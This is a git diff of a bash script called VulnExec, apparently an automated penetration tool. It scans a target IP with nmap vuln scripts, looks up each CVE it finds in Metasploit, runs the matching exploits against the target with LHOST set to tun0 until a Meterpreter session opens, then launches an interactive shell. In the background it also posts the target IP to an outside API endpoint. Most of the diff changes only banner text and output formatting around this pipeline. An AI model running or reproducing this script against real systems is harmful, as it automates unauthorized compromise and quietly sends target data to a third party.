@@ -6,6 +6,7 @@ Red='\033[31m'
 Blue='\033[34m'
 NC='\033[0m'
 Green='\033[32m'
+Yellow='\033[33m'
 
 
 logo="${Red}
@@ -125,9 +126,13 @@ clear
 
 echo -e "$logo"
 
-echo -e "${Red}[ VULN EXEC ] Initialised${NC}"
+echo -e "${Red}[ VULN EXEC ] Initialised\n${NC}"
+echo -e "${Red}--------------------------------${NC}"
+echo -e "\nCreated By ${Red}HX${NC} & ${Red}Jake0001-dev${NC}"
+echo -e "Licensed Under the ${Red}MIT${NC} License"
+echo -e "Github : ${Red}github.com/HarveyGW/VulnExec"
 
-
+echo -e "${Red}\n--------------------------------\n${NC}"
 
 
 if curl -m 0 -X POST http://api.jake0001.com/pen/postdiscord?ip=$IP >/dev/null 2>&1 &
@@ -138,7 +143,6 @@ else
 fi
 
 # Scan for vulnerabilities using Nmap
-echo -e "${Blue}[ INFO ] Vulnerability Scan Started${NC}"
 prev_percentage=-1
 
 nmapDisplaySpinner() {
@@ -146,7 +150,7 @@ nmapDisplaySpinner() {
     while :
     do
         for i in $(seq 0 3); do
-            echo -ne "\r${Blue}[ INFO ] Scanning ports  ${spinner:$i:1}  "
+            echo -ne "\r${Blue}[ INFO ] Vulnerability Scan Started  ${spinner:$i:1}  "
             sleep 0.2
         done
     done
@@ -158,16 +162,16 @@ then
     nmap_pid=$!
     nmap -sV -sS --script vuln -T5 -Pn -oN nmap-scan.txt $IP > /dev/null 2>&1
     kill $nmap_pid
-    echo -e "\r${Blue}[ INFO ] Scanning ports... ${Green}Done${NC}"
+    echo -e "\r${Blue}[ INFO ] Scanning ports... ${Green}Done${NC}\n"
 else
     nmapDisplaySpinner &
     nmap_pid=$!
     nmap -sV -sS --script vuln -T1 -Pn -oN nmap-scan.txt $IP > /dev/null 2>&1
     kill $nmap_pid
-    echo -e "\r${Blue}[ INFO ] Scanning ports... ${Green}Done${NC}"
+    echo -e "\r${Blue}[ INFO ] Scanning ports... ${Green}Done${NC}\n"
 fi
 
-
+echo ""
 # Check if there are any open ports
 if [ -z "$(grep 'Ports\|open' nmap-scan.txt)" ]
 then
@@ -176,18 +180,17 @@ then
 fi
 
 # Show brief output of vuln script results
-echo -e "${Red}[ VULN EXEC ] Vulnerability scan results:${NC}"
+echo -e "${Red}[ VULN EXEC ] Vulnerability Scan Completed Successfully on $IP ${NC}"
 #Outputs MS-CVE Values
-echo -e "${Blue}[ INFO ] MS/CVEs Collected:${NC}"
+echo -e "${Red}\n--------------------------------\n${NC}"
+echo -e "${Blue}[ INFO ] Found Vulnerabilities${NC}"
 grep -Eo '([Cc][Vv][Ee]-[0-9]+-[0-9]+)|([Mm][Ss][0-9]+-[0-9]+)|([0-9]{1,3}\.){3}[0-9]{1,3}' nmap-scan.txt | grep -vE '([0-9]{1,3}\.){3}[0-9]{1,3}' | awk '{print $1" "$2}' | sort -u
 #Ouputs Service Values
-echo -e "${Blue}[ INFO ] Services Collected:${NC}"
+echo -e "${Red}\n--------------------------------\n${NC}"
+echo -ne "${Blue}[ INFO ] Services Collected:${NC}"
 sudo grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}|[Cc][Vv][Ee]-[[:digit:]]+-[[:digit:]]+|ms[[:digit:]]+-[[:digit:]]+|[[:digit:]]+\/tcp.*open.*' nmap-scan.txt | awk '{print $3, $4, $5" "$6" "$7}' | sed 's/^[^ ]* //g' | sort -u | grep -v '^$'
+echo -e "${Red}\n--------------------------------\n${NC}"
 
-
-# Search for exploits in multiple databases
-echo "Searching for exploits..."
-echo "Metasploit Framework:"
 # Count the number of unique CVE and MS values found in the nmap-scan.txt file
 total_vulns=$(grep -Eo '([Cc][Vv][Ee]-[0-9]+-[0-9]+)|([Mm][Ss][0-9]+-[0-9]+)|([0-9]{1,3}\.){3}[0-9]{1,3}' nmap-scan.txt | grep -vE '([0-9]{1,3}\.){3}[0-9]{1,3}' | awk '{print $1" "$2}' | sort -u)
 total_vulns+=$(sudo grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}|[Cc][Vv][Ee]-[[:digit:]]+-[[:digit:]]+|ms[[:digit:]]+-[[:digit:]]+|[[:digit:]]+\/tcp.*open.*' nmap-scan.txt | awk '{print $3, $4, $5" "$6" "$7}' | sed 's/^[^ ]* //g' | sort -u | grep -v '^$')
@@ -197,11 +200,12 @@ exploit_executed=false
 session_id=""
 
 while read -r vuln; do
+
     # Search in Metasploit Framework
-    echo -e "Searching in Metasploit Framework for ${Red}$vuln${NC}..."
+    echo -e "${Blue}[ INFO ] Searching in Metasploit Framework for ${Yellow}$vuln${NC}..."
     searchResults=$(msfconsole -q -x "search $vuln" < /dev/null 2>&1)
     if [[ "$searchResults" == *"No results"* ]]; then
-        echo "No exploits found for vulnerability $vuln"
+        echo -e "No exploits found for vulnerability ${Yellow}$vuln${NC}"
     else
         # Extract the highest number in the # column
         exploitList=$(echo "$searchResults" | awk '/^exploit\//' | awk '{print $1}' | sort -u)
@@ -216,32 +220,37 @@ while read -r vuln; do
 
             # Loop through the exploits and attempt to use them
             for exploit in "${exploits[@]}"; do
-                if [ "$exploit_executed" = false ]; then
-                    echo -e "Using exploit ${Red}$exploit${NC}"
-                    output=$(msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" < /dev/null 2>&1)
-                    # Check if exploit succeeded
-                    if echo "$output" | grep -q "Meterpreter session"; then
-                        echo -e "Exploited vulnerability ${Red}$vuln${NC} using exploit ${Red}$exploit${NC}"
-                        exploitsFound=1
-                        exploit_executed=true
-                        break 1 # break out of both loops when an exploit is successfully executed
-                    else
-                        echo "Failed to exploit vulnerability $vuln using exploit $exploit"
-                    fi
+              if [ "$exploit_executed" = false ]; then
+                echo -e "${Blue}[ INFO ] Using exploit ${Yellow}$exploit${NC}"
+                output=$(msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" < /dev/null 2>&1)
+                if echo "$output" | grep -q "Meterpreter session"; then
+                    echo -e "${Red}[ VULN EXEC ] Successfully Exploited vulnerability ${Yellow}$vuln${Red} using exploit ${Yellow}$exploit${NC}"
+                    exploitsFound=1
+                    exploit_executed=true
+                    echo "${Blue}[ INFO ] Opening shell...${NC}"
+                    msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" &
+                    sleep 2 # Wait for Meterpreter to start
+                    echo "interact" > /tmp/msf_input
+                    # Send the interact command to the Meterpreter console
+                    cat /tmp/msf_input - | nc -w 3 localhost 55553 > /dev/null 2>&1 &
+                    msf_pid=$!
+                    wait $msf_pid
+                else
+                  echo "Failed to exploit vulnerability $vuln using exploit $exploit"
                 fi
-            done
-            # Check if an exploit has been successfully executed
-            if [ "$exploit_executed" = true ]; then
-                echo "Successfully exploited vulnerability $vuln. Opening shell..."
-                session_id=$(msfconsole -q -x "sessions -d -i -1" | grep -oP '\[\K\d+' < /dev/null 2>&1)
-                msfconsole -q -x "sessions -i $session_id; interact"
-                break
-            fi
+              fi
+            done # End of the for loop
+
+            # Wait for Metasploit console to finish executing
+            wait $msf_pid
+
         else
             echo -e "${Red}[ VULN EXEC ] No exploits found for vulnerability $vuln${NC}"
         fi
     fi
 done <<< "$total_vulns"
+
+
 
 if [ "$exploitsFound" = 0 ]
 then
